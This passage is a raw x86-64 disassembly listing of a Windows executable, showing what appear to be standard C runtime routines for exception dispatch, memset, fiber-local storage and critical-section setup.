   140002714:	48 83 ec 40          	sub    $0x40,%rsp
   140002718:	48 8b e9             	mov    %rcx,%rbp
   14000271b:	4d 8b f9             	mov    %r9,%r15
   14000271e:	49 8b c8             	mov    %r8,%rcx
   140002721:	49 8b f8             	mov    %r8,%rdi
   140002724:	4c 8b ea             	mov    %rdx,%r13
   140002727:	e8 98 05 00 00       	call   0x140002cc4
   14000272c:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140002730:	4d 8b 37             	mov    (%r15),%r14
   140002733:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   140002737:	4d 2b f4             	sub    %r12,%r14
   14000273a:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   14000273e:	41 8b 77 48          	mov    0x48(%r15),%esi
   140002742:	0f 85 dc 00 00 00    	jne    0x140002824
   140002748:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   14000274d:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140002752:	3b 33                	cmp    (%rbx),%esi
   140002754:	0f 83 8a 01 00 00    	jae    0x1400028e4
   14000275a:	8b fe                	mov    %esi,%edi
   14000275c:	48 03 ff             	add    %rdi,%rdi
   14000275f:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   140002763:	4c 3b f0             	cmp    %rax,%r14
   140002766:	0f 82 aa 00 00 00    	jb     0x140002816
   14000276c:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   140002770:	4c 3b f0             	cmp    %rax,%r14
   140002773:	0f 83 9d 00 00 00    	jae    0x140002816
   140002779:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   14000277e:	0f 84 92 00 00 00    	je     0x140002816
   140002784:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   140002789:	74 17                	je     0x1400027a2
   14000278b:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   14000278f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002794:	49 03 c4             	add    %r12,%rax
   140002797:	49 8b d5             	mov    %r13,%rdx
   14000279a:	ff d0                	call   *%rax
   14000279c:	85 c0                	test   %eax,%eax
   14000279e:	78 7d                	js     0x14000281d
   1400027a0:	7e 74                	jle    0x140002816
   1400027a2:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   1400027a9:	75 28                	jne    0x1400027d3
   1400027ab:	48 83 3d 3d bb 00 00 	cmpq   $0x0,0xbb3d(%rip)        # 0x14000e2f0
   1400027b2:	00 
   1400027b3:	74 1e                	je     0x1400027d3
   1400027b5:	48 8d 0d 34 bb 00 00 	lea    0xbb34(%rip),%rcx        # 0x14000e2f0
   1400027bc:	e8 9f ac 00 00       	call   0x14000d460
   1400027c1:	85 c0                	test   %eax,%eax
   1400027c3:	74 0e                	je     0x1400027d3
   1400027c5:	ba 01 00 00 00       	mov    $0x1,%edx
   1400027ca:	48 8b cd             	mov    %rbp,%rcx
   1400027cd:	ff 15 1d bb 00 00    	call   *0xbb1d(%rip)        # 0x14000e2f0
   1400027d3:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   1400027d7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400027dd:	49 03 cc             	add    %r12,%rcx
   1400027e0:	49 8b d5             	mov    %r13,%rdx
   1400027e3:	e8 a8 04 00 00       	call   0x140002c90
   1400027e8:	49 8b 47 40          	mov    0x40(%r15),%rax
   1400027ec:	4c 8b c5             	mov    %rbp,%r8
   1400027ef:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   1400027f3:	49 8b cd             	mov    %r13,%rcx
   1400027f6:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   1400027fa:	49 03 d4             	add    %r12,%rdx
   1400027fd:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002802:	49 8b 47 28          	mov    0x28(%r15),%rax
   140002806:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000280b:	ff 15 77 b8 00 00    	call   *0xb877(%rip)        # 0x14000e088
   140002811:	e8 aa 04 00 00       	call   0x140002cc0
   140002816:	ff c6                	inc    %esi
   140002818:	e9 35 ff ff ff       	jmp    0x140002752
   14000281d:	33 c0                	xor    %eax,%eax
   14000281f:	e9 c5 00 00 00       	jmp    0x1400028e9
   140002824:	49 8b 7f 20          	mov    0x20(%r15),%rdi
   140002828:	44 8b 0b             	mov    (%rbx),%r9d
   14000282b:	49 2b fc             	sub    %r12,%rdi
   14000282e:	41 3b f1             	cmp    %r9d,%esi
   140002831:	0f 83 ad 00 00 00    	jae    0x1400028e4
   140002837:	45 8b c1             	mov    %r9d,%r8d
   14000283a:	8b d6                	mov    %esi,%edx
   14000283c:	41 8b c8             	mov    %r8d,%ecx
   14000283f:	48 03 d2             	add    %rdx,%rdx
   140002842:	8b 44 d3 04          	mov    0x4(%rbx,%rdx,8),%eax
   140002846:	4c 3b f0             	cmp    %rax,%r14
   140002849:	0f 82 88 00 00 00    	jb     0x1400028d7
   14000284f:	8b 44 d3 08          	mov    0x8(%rbx,%rdx,8),%eax
   140002853:	4c 3b f0             	cmp    %rax,%r14
   140002856:	73 7f                	jae    0x1400028d7
   140002858:	44 8b 5d 04          	mov    0x4(%rbp),%r11d
   14000285c:	41 83 e3 20          	and    $0x20,%r11d
   140002860:	74 44                	je     0x1400028a6
   140002862:	45 33 d2             	xor    %r10d,%r10d
   140002865:	45 85 c0             	test   %r8d,%r8d
   140002868:	74 34                	je     0x14000289e
   14000286a:	41 8b ca             	mov    %r10d,%ecx
   14000286d:	48 03 c9             	add    %rcx,%rcx
   140002870:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140002874:	48 3b f8             	cmp    %rax,%rdi
   140002877:	72 1d                	jb     0x140002896
   140002879:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   14000287d:	48 3b f8             	cmp    %rax,%rdi
   140002880:	73 14                	jae    0x140002896
   140002882:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   140002886:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   14000288a:	75 0a                	jne    0x140002896
   14000288c:	8b 44 d3 0c          	mov    0xc(%rbx,%rdx,8),%eax
   140002890:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   140002894:	74 08                	je     0x14000289e
   140002896:	41 ff c2             	inc    %r10d
   140002899:	45 3b d0             	cmp    %r8d,%r10d
   14000289c:	72 cc                	jb     0x14000286a
   14000289e:	41 8b c9             	mov    %r9d,%ecx
   1400028a1:	45 3b d1             	cmp    %r9d,%r10d
   1400028a4:	75 3e                	jne    0x1400028e4
   1400028a6:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   1400028aa:	85 c0                	test   %eax,%eax
   1400028ac:	74 0c                	je     0x1400028ba
   1400028ae:	48 3b f8             	cmp    %rax,%rdi
   1400028b1:	75 24                	jne    0x1400028d7
   1400028b3:	45 85 db             	test   %r11d,%r11d
   1400028b6:	75 2c                	jne    0x1400028e4
   1400028b8:	eb 1d                	jmp    0x1400028d7
   1400028ba:	8d 46 01             	lea    0x1(%rsi),%eax
   1400028bd:	b1 01                	mov    $0x1,%cl
   1400028bf:	41 89 47 48          	mov    %eax,0x48(%r15)
   1400028c3:	44 8b 44 d3 0c       	mov    0xc(%rbx,%rdx,8),%r8d
   1400028c8:	49 8b d5             	mov    %r13,%rdx
   1400028cb:	4d 03 c4             	add    %r12,%r8
   1400028ce:	41 ff d0             	call   *%r8
   1400028d1:	44 8b 0b             	mov    (%rbx),%r9d
   1400028d4:	41 8b c9             	mov    %r9d,%ecx
   1400028d7:	ff c6                	inc    %esi
   1400028d9:	44 8b c1             	mov    %ecx,%r8d
   1400028dc:	3b f1                	cmp    %ecx,%esi
   1400028de:	0f 82 56 ff ff ff    	jb     0x14000283a
   1400028e4:	b8 01 00 00 00       	mov    $0x1,%eax
   1400028e9:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400028ee:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400028f2:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400028f6:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400028fa:	49 8b e3             	mov    %r11,%rsp
   1400028fd:	41 5f                	pop    %r15
   1400028ff:	41 5e                	pop    %r14
   140002901:	41 5d                	pop    %r13
   140002903:	41 5c                	pop    %r12
   140002905:	5f                   	pop    %rdi
   140002906:	c3                   	ret
   140002907:	cc                   	int3
   140002908:	48 83 ec 28          	sub    $0x28,%rsp
   14000290c:	e8 eb 03 00 00       	call   0x140002cfc
   140002911:	84 c0                	test   %al,%al
   140002913:	75 04                	jne    0x140002919
   140002915:	32 c0                	xor    %al,%al
   140002917:	eb 12                	jmp    0x14000292b
   140002919:	e8 ee 02 00 00       	call   0x140002c0c
   14000291e:	84 c0                	test   %al,%al
   140002920:	75 07                	jne    0x140002929
   140002922:	e8 09 04 00 00       	call   0x140002d30
   140002927:	eb ec                	jmp    0x140002915
   140002929:	b0 01                	mov    $0x1,%al
   14000292b:	48 83 c4 28          	add    $0x28,%rsp
   14000292f:	c3                   	ret
   140002930:	48 83 ec 28          	sub    $0x28,%rsp
   140002934:	84 c9                	test   %cl,%cl
   140002936:	75 0a                	jne    0x140002942
   140002938:	e8 17 03 00 00       	call   0x140002c54
   14000293d:	e8 ee 03 00 00       	call   0x140002d30
   140002942:	b0 01                	mov    $0x1,%al
   140002944:	48 83 c4 28          	add    $0x28,%rsp
   140002948:	c3                   	ret
   140002949:	cc                   	int3
   14000294a:	cc                   	int3
   14000294b:	cc                   	int3
   14000294c:	cc                   	int3
   14000294d:	cc                   	int3
   14000294e:	cc                   	int3
   14000294f:	cc                   	int3
   140002950:	cc                   	int3
   140002951:	cc                   	int3
   140002952:	cc                   	int3
   140002953:	cc                   	int3
   140002954:	cc                   	int3
   140002955:	cc                   	int3
   140002956:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000295d:	00 00 00 
   140002960:	57                   	push   %rdi
   140002961:	8b c2                	mov    %edx,%eax
   140002963:	48 8b f9             	mov    %rcx,%rdi
   140002966:	49 8b c8             	mov    %r8,%rcx
   140002969:	f3 aa                	rep stos %al,(%rdi)
   14000296b:	49 8b c3             	mov    %r11,%rax
   14000296e:	5f                   	pop    %rdi
   14000296f:	c3                   	ret
   140002970:	cc                   	int3
   140002971:	cc                   	int3
   140002972:	cc                   	int3
   140002973:	cc                   	int3
   140002974:	cc                   	int3
   140002975:	cc                   	int3
   140002976:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000297d:	00 00 00 
   140002980:	4c 8b d9             	mov    %rcx,%r11
   140002983:	0f b6 d2             	movzbl %dl,%edx
   140002986:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   14000298d:	01 01 01 
   140002990:	4c 0f af ca          	imul   %rdx,%r9
   140002994:	49 83 f8 10          	cmp    $0x10,%r8
   140002998:	0f 86 f2 00 00 00    	jbe    0x140002a90
   14000299e:	66 49 0f 6e c1       	movq   %r9,%xmm0
   1400029a3:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   1400029a7:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400029ae:	77 10                	ja     0x1400029c0
   1400029b0:	e9 6b 00 00 00       	jmp    0x140002a20
   1400029b5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400029bc:	00 00 00 00 
   1400029c0:	f6 05 e9 50 01 00 02 	testb  $0x2,0x150e9(%rip)        # 0x140017ab0
   1400029c7:	75 97                	jne    0x140002960
   1400029c9:	0f 11 01             	movups %xmm0,(%rcx)
   1400029cc:	4c 03 c1             	add    %rcx,%r8
   1400029cf:	48 83 c1 10          	add    $0x10,%rcx
   1400029d3:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   1400029d7:	4c 2b c1             	sub    %rcx,%r8
   1400029da:	4d 8b c8             	mov    %r8,%r9
   1400029dd:	49 c1 e9 07          	shr    $0x7,%r9
   1400029e1:	74 3d                	je     0x140002a20
   1400029e3:	4c 3b 0d 2e 46 01 00 	cmp    0x1462e(%rip),%r9        # 0x140017018
   1400029ea:	0f 87 60 00 00 00    	ja     0x140002a50
   1400029f0:	0f 29 01             	movaps %xmm0,(%rcx)
   1400029f3:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1400029f7:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400029fe:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   140002a02:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   140002a06:	49 ff c9             	dec    %r9
   140002a09:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   140002a0d:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   140002a11:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   140002a15:	66 0f 29 41 f0       	movapd %xmm0,-0x10(%rcx)
   140002a1a:	75 d4                	jne    0x1400029f0
   140002a1c:	49 83 e0 7f          	and    $0x7f,%r8
   140002a20:	4d 8b c8             	mov    %r8,%r9
   140002a23:	49 c1 e9 04          	shr    $0x4,%r9
   140002a27:	74 13                	je     0x140002a3c
   140002a29:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002a30:	0f 11 01             	movups %xmm0,(%rcx)
   140002a33:	48 83 c1 10          	add    $0x10,%rcx
   140002a37:	49 ff c9             	dec    %r9
   140002a3a:	75 f4                	jne    0x140002a30
   140002a3c:	49 83 e0 0f          	and    $0xf,%r8
   140002a40:	74 06                	je     0x140002a48
   140002a42:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   140002a48:	49 8b c3             	mov    %r11,%rax
   140002a4b:	c3                   	ret
   140002a4c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002a50:	0f 2b 01             	movntps %xmm0,(%rcx)
   140002a53:	0f 2b 41 10          	movntps %xmm0,0x10(%rcx)
   140002a57:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140002a5e:	0f 2b 41 a0          	movntps %xmm0,-0x60(%rcx)
   140002a62:	0f 2b 41 b0          	movntps %xmm0,-0x50(%rcx)
   140002a66:	49 ff c9             	dec    %r9
   140002a69:	0f 2b 41 c0          	movntps %xmm0,-0x40(%rcx)
   140002a6d:	0f 2b 41 d0          	movntps %xmm0,-0x30(%rcx)
   140002a71:	0f 2b 41 e0          	movntps %xmm0,-0x20(%rcx)
   140002a75:	0f 2b 41 f0          	movntps %xmm0,-0x10(%rcx)
   140002a79:	75 d5                	jne    0x140002a50
   140002a7b:	0f ae f8             	sfence
   140002a7e:	49 83 e0 7f          	and    $0x7f,%r8
   140002a82:	eb 9c                	jmp    0x140002a20
   140002a84:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002a8b:	00 00 00 00 00 
   140002a90:	49 8b d1             	mov    %r9,%rdx
   140002a93:	4c 8d 0d 66 d5 ff ff 	lea    -0x2a9a(%rip),%r9        # 0x140000000
   140002a9a:	43 8b 84 81 00 a0 01 	mov    0x1a000(%r9,%r8,4),%eax
   140002aa1:	00 
   140002aa2:	4c 03 c8             	add    %rax,%r9
   140002aa5:	49 03 c8             	add    %r8,%rcx
   140002aa8:	49 8b c3             	mov    %r11,%rax
   140002aab:	41 ff e1             	jmp    *%r9
   140002aae:	66 90                	xchg   %ax,%ax
   140002ab0:	48 89 51 f1          	mov    %rdx,-0xf(%rcx)
   140002ab4:	89 51 f9             	mov    %edx,-0x7(%rcx)
   140002ab7:	66 89 51 fd          	mov    %dx,-0x3(%rcx)
   140002abb:	88 51 ff             	mov    %dl,-0x1(%rcx)
   140002abe:	c3                   	ret
   140002abf:	90                   	nop
   140002ac0:	48 89 51 f4          	mov    %rdx,-0xc(%rcx)
   140002ac4:	89 51 fc             	mov    %edx,-0x4(%rcx)
   140002ac7:	c3                   	ret
   140002ac8:	48 89 51 f7          	mov    %rdx,-0x9(%rcx)
   140002acc:	88 51 ff             	mov    %dl,-0x1(%rcx)
   140002acf:	c3                   	ret
   140002ad0:	48 89 51 f3          	mov    %rdx,-0xd(%rcx)
   140002ad4:	89 51 fb             	mov    %edx,-0x5(%rcx)
   140002ad7:	88 51 ff             	mov    %dl,-0x1(%rcx)
   140002ada:	c3                   	ret
   140002adb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ae0:	48 89 51 f2          	mov    %rdx,-0xe(%rcx)
   140002ae4:	89 51 fa             	mov    %edx,-0x6(%rcx)
   140002ae7:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   140002aeb:	c3                   	ret
   140002aec:	48 89 10             	mov    %rdx,(%rax)
   140002aef:	c3                   	ret
   140002af0:	48 89 10             	mov    %rdx,(%rax)
   140002af3:	66 89 50 08          	mov    %dx,0x8(%rax)
   140002af7:	88 50 0a             	mov    %dl,0xa(%rax)
   140002afa:	c3                   	ret
   140002afb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b00:	48 89 10             	mov    %rdx,(%rax)
   140002b03:	66 89 50 08          	mov    %dx,0x8(%rax)
   140002b07:	c3                   	ret
   140002b08:	48 89 10             	mov    %rdx,(%rax)
   140002b0b:	48 89 50 08          	mov    %rdx,0x8(%rax)
   140002b0f:	c3                   	ret
   140002b10:	48 83 ec 28          	sub    $0x28,%rsp
   140002b14:	48 85 c9             	test   %rcx,%rcx
   140002b17:	74 11                	je     0x140002b2a
   140002b19:	48 8d 05 a0 4f 01 00 	lea    0x14fa0(%rip),%rax        # 0x140017ac0
   140002b20:	48 3b c8             	cmp    %rax,%rcx
   140002b23:	74 05                	je     0x140002b2a
   140002b25:	e8 6e 21 00 00       	call   0x140004c98
   140002b2a:	48 83 c4 28          	add    $0x28,%rsp
   140002b2e:	c3                   	ret
   140002b2f:	cc                   	int3
   140002b30:	48 83 ec 28          	sub    $0x28,%rsp
   140002b34:	e8 13 00 00 00       	call   0x140002b4c
   140002b39:	48 85 c0             	test   %rax,%rax
   140002b3c:	74 05                	je     0x140002b43
   140002b3e:	48 83 c4 28          	add    $0x28,%rsp
   140002b42:	c3                   	ret
   140002b43:	e8 f8 20 00 00       	call   0x140004c40
   140002b48:	cc                   	int3
   140002b49:	cc                   	int3
   140002b4a:	cc                   	int3
   140002b4b:	cc                   	int3
   140002b4c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002b51:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002b56:	57                   	push   %rdi
   140002b57:	48 83 ec 20          	sub    $0x20,%rsp
   140002b5b:	83 3d ce 44 01 00 ff 	cmpl   $0xffffffff,0x144ce(%rip)        # 0x140017030
   140002b62:	75 07                	jne    0x140002b6b
   140002b64:	33 c0                	xor    %eax,%eax
   140002b66:	e9 90 00 00 00       	jmp    0x140002bfb
   140002b6b:	ff 15 1f b5 00 00    	call   *0xb51f(%rip)        # 0x14000e090
   140002b71:	8b 0d b9 44 01 00    	mov    0x144b9(%rip),%ecx        # 0x140017030
   140002b77:	8b f8                	mov    %eax,%edi
   140002b79:	e8 ca 03 00 00       	call   0x140002f48
   140002b7e:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140002b82:	33 f6                	xor    %esi,%esi
   140002b84:	48 3b c2             	cmp    %rdx,%rax
   140002b87:	74 67                	je     0x140002bf0
   140002b89:	48 85 c0             	test   %rax,%rax
   140002b8c:	74 05                	je     0x140002b93
   140002b8e:	48 8b f0             	mov    %rax,%rsi
   140002b91:	eb 5d                	jmp    0x140002bf0
   140002b93:	8b 0d 97 44 01 00    	mov    0x14497(%rip),%ecx        # 0x140017030
   140002b99:	e8 f2 03 00 00       	call   0x140002f90
   140002b9e:	85 c0                	test   %eax,%eax
   140002ba0:	74 4e                	je     0x140002bf0
   140002ba2:	ba 80 00 00 00       	mov    $0x80,%edx
   140002ba7:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140002baa:	e8 5d 21 00 00       	call   0x140004d0c
   140002baf:	8b 0d 7b 44 01 00    	mov    0x1447b(%rip),%ecx        # 0x140017030
   140002bb5:	48 8b d8             	mov    %rax,%rbx
   140002bb8:	48 85 c0             	test   %rax,%rax
   140002bbb:	74 24                	je     0x140002be1
   140002bbd:	48 8b d0             	mov    %rax,%rdx
   140002bc0:	e8 cb 03 00 00       	call   0x140002f90
   140002bc5:	85 c0                	test   %eax,%eax
   140002bc7:	74 12                	je     0x140002bdb
   140002bc9:	48 8b c3             	mov    %rbx,%rax
   140002bcc:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140002bd3:	48 8b de             	mov    %rsi,%rbx
   140002bd6:	48 8b f0             	mov    %rax,%rsi
   140002bd9:	eb 0d                	jmp    0x140002be8
   140002bdb:	8b 0d 4f 44 01 00    	mov    0x1444f(%rip),%ecx        # 0x140017030
   140002be1:	33 d2                	xor    %edx,%edx
   140002be3:	e8 a8 03 00 00       	call   0x140002f90
   140002be8:	48 8b cb             	mov    %rbx,%rcx
   140002beb:	e8 a8 20 00 00       	call   0x140004c98
   140002bf0:	8b cf                	mov    %edi,%ecx
   140002bf2:	ff 15 a0 b4 00 00    	call   *0xb4a0(%rip)        # 0x14000e098
   140002bf8:	48 8b c6             	mov    %rsi,%rax
   140002bfb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002c00:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002c05:	48 83 c4 20          	add    $0x20,%rsp
   140002c09:	5f                   	pop    %rdi
   140002c0a:	c3                   	ret
   140002c0b:	cc                   	int3
   140002c0c:	48 83 ec 28          	sub    $0x28,%rsp
   140002c10:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x140002b10
   140002c17:	e8 9c 02 00 00       	call   0x140002eb8
   140002c1c:	89 05 0e 44 01 00    	mov    %eax,0x1440e(%rip)        # 0x140017030
   140002c22:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002c25:	74 25                	je     0x140002c4c
   140002c27:	48 8d 15 92 4e 01 00 	lea    0x14e92(%rip),%rdx        # 0x140017ac0
   140002c2e:	8b c8                	mov    %eax,%ecx
   140002c30:	e8 5b 03 00 00       	call   0x140002f90
   140002c35:	85 c0                	test   %eax,%eax
   140002c37:	74 0e                	je     0x140002c47
   140002c39:	c7 05 f5 4e 01 00 fe 	movl   $0xfffffffe,0x14ef5(%rip)        # 0x140017b38
   140002c40:	ff ff ff 
   140002c43:	b0 01                	mov    $0x1,%al
   140002c45:	eb 07                	jmp    0x140002c4e
   140002c47:	e8 08 00 00 00       	call   0x140002c54
   140002c4c:	32 c0                	xor    %al,%al
   140002c4e:	48 83 c4 28          	add    $0x28,%rsp
   140002c52:	c3                   	ret
   140002c53:	cc                   	int3
   140002c54:	48 83 ec 28          	sub    $0x28,%rsp
   140002c58:	8b 0d d2 43 01 00    	mov    0x143d2(%rip),%ecx        # 0x140017030
   140002c5e:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140002c61:	74 0c                	je     0x140002c6f
   140002c63:	e8 98 02 00 00       	call   0x140002f00
   140002c68:	83 0d c1 43 01 00 ff 	orl    $0xffffffff,0x143c1(%rip)        # 0x140017030
   140002c6f:	b0 01                	mov    $0x1,%al
   140002c71:	48 83 c4 28          	add    $0x28,%rsp
   140002c75:	c3                   	ret
   140002c76:	cc                   	int3
   140002c77:	cc                   	int3
   140002c78:	cc                   	int3
   140002c79:	cc                   	int3
   140002c7a:	cc                   	int3
   140002c7b:	cc                   	int3
   140002c7c:	cc                   	int3
   140002c7d:	cc                   	int3
   140002c7e:	cc                   	int3
   140002c7f:	cc                   	int3
   140002c80:	cc                   	int3
   140002c81:	cc                   	int3
   140002c82:	cc                   	int3
   140002c83:	cc                   	int3
   140002c84:	cc                   	int3
   140002c85:	cc                   	int3
   140002c86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002c8d:	00 00 00 
   140002c90:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002c95:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140002c9a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140002c9f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140002ca6:	eb 08                	jmp    0x140002cb0
   140002ca8:	cc                   	int3
   140002ca9:	cc                   	int3
   140002caa:	cc                   	int3
   140002cab:	cc                   	int3
   140002cac:	cc                   	int3
   140002cad:	cc                   	int3
   140002cae:	66 90                	xchg   %ax,%ax
   140002cb0:	c3                   	ret
   140002cb1:	cc                   	int3
   140002cb2:	cc                   	int3
   140002cb3:	cc                   	int3
   140002cb4:	cc                   	int3
   140002cb5:	cc                   	int3
   140002cb6:	cc                   	int3
   140002cb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002cbe:	00 00 
   140002cc0:	c3                   	ret
   140002cc1:	cc                   	int3
   140002cc2:	cc                   	int3
   140002cc3:	cc                   	int3
   140002cc4:	48 8b 05 5d b5 00 00 	mov    0xb55d(%rip),%rax        # 0x14000e228
   140002ccb:	48 8d 15 f6 f4 ff ff 	lea    -0xb0a(%rip),%rdx        # 0x1400021c8
   140002cd2:	48 3b c2             	cmp    %rdx,%rax
   140002cd5:	74 23                	je     0x140002cfa
   140002cd7:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140002cde:	00 00 
   140002ce0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140002ce7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140002ceb:	72 06                	jb     0x140002cf3
   140002ced:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140002cf1:	76 07                	jbe    0x140002cfa
   140002cf3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002cf8:	cd 29                	int    $0x29
   140002cfa:	c3                   	ret
   140002cfb:	cc                   	int3
   140002cfc:	48 83 ec 28          	sub    $0x28,%rsp
   140002d00:	45 33 c0             	xor    %r8d,%r8d
   140002d03:	48 8d 0d 36 4e 01 00 	lea    0x14e36(%rip),%rcx        # 0x140017b40
   140002d0a:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140002d0f:	e8 d0 02 00 00       	call   0x140002fe4
   140002d14:	85 c0                	test   %eax,%eax
   140002d16:	74 0a                	je     0x140002d22
   140002d18:	ff 05 4a 4e 01 00    	incl   0x14e4a(%rip)        # 0x140017b68
   140002d1e:	b0 01                	mov    $0x1,%al
   140002d20:	eb 07                	jmp    0x140002d29
   140002d22:	e8 09 00 00 00       	call   0x140002d30
   140002d27:	32 c0                	xor    %al,%al
   140002d29:	48 83 c4 28          	add    $0x28,%rsp
   140002d2d:	c3                   	ret
   140002d2e:	cc                   	int3
   140002d2f:	cc                   	int3
   140002d30:	40 53                	rex push %rbx
   140002d32:	48 83 ec 20          	sub    $0x20,%rsp
   140002d36:	8b 1d 2c 4e 01 00    	mov    0x14e2c(%rip),%ebx        # 0x140017b68
   140002d3c:	eb 1d                	jmp    0x140002d5b
   140002d3e:	48 8d 05 fb 4d 01 00 	lea    0x14dfb(%rip),%rax        # 0x140017b40
   140002d45:	ff cb                	dec    %ebx
   140002d47:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140002d4b:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140002d4f:	ff 15 63 b3 00 00    	call   *0xb363(%rip)        # 0x14000e0b8
   140002d55:	ff 0d 0d 4e 01 00    	decl   0x14e0d(%rip)        # 0x140017b68
   140002d5b:	85 db                	test   %ebx,%ebx
   140002d5d:	75 df                	jne    0x140002d3e
   140002d5f:	b0 01                	mov    $0x1,%al
   140002d61:	48 83 c4 20          	add    $0x20,%rsp
   140002d65:	5b                   	pop    %rbx
   140002d66:	c3                   	ret
   140002d67:	cc                   	int3
   140002d68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002d6d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002d72:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002d77:	57                   	push   %rdi
   140002d78:	41 54                	push   %r12
   140002d7a:	41 55                	push   %r13
   140002d7c:	41 56                	push   %r14
   140002d7e:	41 57                	push   %r15
   140002d80:	48 83 ec 20          	sub    $0x20,%rsp
   140002d84:	8b f9                	mov    %ecx,%edi
   140002d86:	4c 8d 3d 73 d2 ff ff 	lea    -0x2d8d(%rip),%r15        # 0x140000000
   140002d8d:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140002d91:	4d 8b e1             	mov    %r9,%r12
   140002d94:	49 8b e8             	mov    %r8,%rbp
   140002d97:	4c 8b ea             	mov    %rdx,%r13
   140002d9a:	49 8b 84 ff f0 7b 01 	mov    0x17bf0(%r15,%rdi,8),%rax
   140002da1:	00 
   140002da2:	90                   	nop
   140002da3:	49 3b c6             	cmp    %r14,%rax
   140002da6:	0f 84 eb 00 00 00    	je     0x140002e97
   140002dac:	48 85 c0             	test   %rax,%rax
   140002daf:	0f 85 e4 00 00 00    	jne    0x140002e99
   140002db5:	4d 3b c1             	cmp    %r9,%r8
   140002db8:	0f 84 d1 00 00 00    	je     0x140002e8f
   140002dbe:	8b 75 00             	mov    0x0(%rbp),%esi
   140002dc1:	49 8b 9c f7 d8 7b 01 	mov    0x17bd8(%r15,%rsi,8),%rbx
   140002dc8:	00 
   140002dc9:	90                   	nop
   140002dca:	48 85 db             	test   %rbx,%rbx
   140002dcd:	74 0b                	je     0x140002dda
   140002dcf:	49 3b de             	cmp    %r14,%rbx
